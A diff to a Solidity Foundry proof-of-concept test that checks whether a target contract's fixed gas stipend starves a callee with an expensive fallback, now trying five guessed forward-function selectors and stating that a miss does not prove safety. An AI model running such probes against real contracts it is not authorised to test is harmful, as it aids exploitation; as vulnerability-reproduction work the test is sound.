@@ -86,15 +86,36 @@ contract PoC is Test {
         assertTrue(!ok || recipient.counter() == 0, "exploit did not reproduce: stipend covered the recipient");
     }
 
+    /// One forward attempt. Success is the CALLEE BEING STARVED (its counter
+    /// never advanced) — never the forward call returning. A wrong selector
+    /// changes nothing and is not it.
+    function _forwardOnce(ExpensiveFallback callee, string memory label, bytes memory data)
+        internal
+        returns (bool)
+    {
+        (bool ok,) = target.call(data);
+        console.log("tried", label, ok ? "call returned" : "call reverted");
+        return ok && callee.counter() == 0;
+    }
+
     function test_hardcodedGasFails() public {
         ExpensiveFallback expensive = new ExpensiveFallback();
 
-        // TODO: adapt to the target's real fixed-gas forward function.
-        (bool ok,) = target.call(
-            abi.encodeWithSignature("execute(address,bytes)", address(expensive), bytes(""))
-        );
-        require(ok, "execute(address,bytes) call failed -- adapt to the target's forward function");
+        // The forward function is a GUESS on an unverified target, and one wrong
+        // name reports "not reproduced" for a vulnerability that exists under
+        // another.
+        bytes memory payload = bytes("");
+        bool reproduced;
+        if (!reproduced) reproduced = _forwardOnce(expensive, "execute(address,bytes)", abi.encodeWithSignature("execute(address,bytes)", address(expensive), payload));
+        if (!reproduced) reproduced = _forwardOnce(expensive, "call(address,bytes)", abi.encodeWithSignature("call(address,bytes)", address(expensive), payload));
+        if (!reproduced) reproduced = _forwardOnce(expensive, "forward(address,bytes)", abi.encodeWithSignature("forward(address,bytes)", address(expensive), payload));
+        if (!reproduced) reproduced = _forwardOnce(expensive, "run(address,bytes)", abi.encodeWithSignature("run(address,bytes)", address(expensive), payload));
+        if (!reproduced) reproduced = _forwardOnce(expensive, "invoke(address,bytes)", abi.encodeWithSignature("invoke(address,bytes)", address(expensive), payload));
+
         console.log("expensive callee counter (0 = out of gas):", expensive.counter());
-        assertEq(expensive.counter(), 0, "exploit did not reproduce: fixed gas covered the callee");
+        assertTrue(
+            reproduced,
+            "no forward entry point starved the callee. Tried execute(address,bytes), call(address,bytes), forward(address,bytes), run(address,bytes), invoke(address,bytes). This does NOT establish safety: the forward function may have another name, take other arguments, or forward enough gas."
+        );
     }
 }
